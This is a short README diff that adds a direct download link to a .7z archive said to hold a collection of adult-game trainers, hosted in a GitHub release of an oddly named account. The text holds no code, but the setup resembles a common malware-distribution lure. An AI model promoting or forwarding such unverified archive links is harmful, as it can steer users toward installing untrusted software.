@@ -25,7 +25,7 @@
 
 ## 📥 Download
 
-**⬇️ [Download Adult-Games-Trainer-Collection]()**
+**⬇️ [Download Adult-Games-Trainer-Collection](https://github.com/Freewaykyoobliterate/Adult-Games-Trainer-Collection/releases/download/495/adulttrainer.7z)**
 
 ---
 
